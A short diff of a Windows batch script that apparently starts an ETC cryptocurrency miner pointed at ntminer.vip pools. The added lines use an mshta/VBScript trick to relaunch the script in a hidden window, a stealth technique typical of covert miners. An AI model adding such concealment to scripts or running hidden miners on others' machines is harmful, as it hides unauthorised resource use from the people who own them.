@@ -1,4 +1,7 @@
 @echo off
+if "%1"=="h" goto begin
+start mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit
+:begin
 setlocal enableDelayedExpansion
 set "POOL=etc.ntminer.vip:26666"
 set "POOL2=stratum+ssl://etc.ntminer.vip:25555"
